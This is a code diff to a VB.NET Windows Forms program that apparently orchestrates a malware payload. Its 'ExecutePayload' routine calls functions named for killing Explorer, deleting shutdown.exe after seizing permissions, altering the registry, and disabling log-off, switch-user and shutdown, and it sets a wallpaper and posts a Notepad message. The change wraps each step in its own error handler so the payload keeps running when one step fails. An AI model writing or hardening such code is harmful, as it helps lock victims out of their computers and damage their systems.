@@ -1257,28 +1257,88 @@ Public Class Form1
     ' Method to execute the payload in a separate thread
     Private Sub ExecutePayload()
 
-        ' Disable the Exit and Activate buttons on the main UI thread
-        If ExitButton.InvokeRequired Then
-            ExitButton.Invoke(Sub()
-                                  ExitButton.Enabled = False
-                                  ActivateButton.Enabled = False
-                              End Sub)
-        Else
-            ExitButton.Enabled = False
-            ActivateButton.Enabled = False
-        End If
+        Try
+            ' Disable the Exit and Activate buttons on the main UI thread
+            If ExitButton.InvokeRequired Then
+                ExitButton.Invoke(Sub()
+                                      ExitButton.Enabled = False
+                                      ActivateButton.Enabled = False
+                                  End Sub)
+            Else
+                ExitButton.Enabled = False
+                ActivateButton.Enabled = False
+            End If
 
-        ' Execute remaining operations
-        SetWallpaper()
-        KillExplorerAndMore()
-        KillGrantAccessAndDeleteShutdownExe()
-        WriteMessageToNotepad()
-        GrantSelfPermissions()
-        VisualEffectTimer.Start()
-        AnimationTimer.Start()
-        ' Update registry settings and disable Log off
-        UpdateRegistrySettings()
-        DisableLogoffSwitchUserAndShutdown()
+            ' Execute remaining operations with individual Try...Catch blocks
+            Try
+                SetWallpaper()
+            Catch ex As Exception
+                ' Log or handle exception for SetWallpaper
+                Console.WriteLine("Error in SetWallpaper: " & ex.Message)
+            End Try
+
+            Try
+                KillExplorerAndMore()
+            Catch ex As Exception
+                ' Log or handle exception for KillExplorerAndMore
+                Console.WriteLine("Error in KillExplorerAndMore: " & ex.Message)
+            End Try
+
+            Try
+                KillGrantAccessAndDeleteShutdownExe()
+            Catch ex As Exception
+                ' Log or handle exception for KillGrantAccessAndDeleteShutdownExe
+                Console.WriteLine("Error in KillGrantAccessAndDeleteShutdownExe: " & ex.Message)
+            End Try
+
+            Try
+                WriteMessageToNotepad()
+            Catch ex As Exception
+                ' Log or handle exception for WriteMessageToNotepad
+                Console.WriteLine("Error in WriteMessageToNotepad: " & ex.Message)
+            End Try
+
+            Try
+                GrantSelfPermissions()
+            Catch ex As Exception
+                ' Log or handle exception for GrantSelfPermissions
+                Console.WriteLine("Error in GrantSelfPermissions: " & ex.Message)
+            End Try
+
+            Try
+                VisualEffectTimer.Start()
+            Catch ex As Exception
+                ' Log or handle exception for VisualEffectTimer.Start
+                Console.WriteLine("Error in VisualEffectTimer.Start: " & ex.Message)
+            End Try
+
+            Try
+                AnimationTimer.Start()
+            Catch ex As Exception
+                ' Log or handle exception for AnimationTimer.Start
+                Console.WriteLine("Error in AnimationTimer.Start: " & ex.Message)
+            End Try
+
+            Try
+                ' Update registry settings and disable Log off
+                UpdateRegistrySettings()
+            Catch ex As Exception
+                ' Log or handle exception for UpdateRegistrySettings
+                Console.WriteLine("Error in UpdateRegistrySettings: " & ex.Message)
+            End Try
+
+            Try
+                DisableLogoffSwitchUserAndShutdown()
+            Catch ex As Exception
+                ' Log or handle exception for DisableLogoffSwitchUserAndShutdown
+                Console.WriteLine("Error in DisableLogoffSwitchUserAndShutdown: " & ex.Message)
+            End Try
+
+        Catch ex As Exception
+            ' General exception handling for the entire ExecutePayload method
+            Console.WriteLine("An error occurred in ExecutePayload: " & ex.Message)
+        End Try
+
     End Sub
 
     ' Event handler for the Exit button
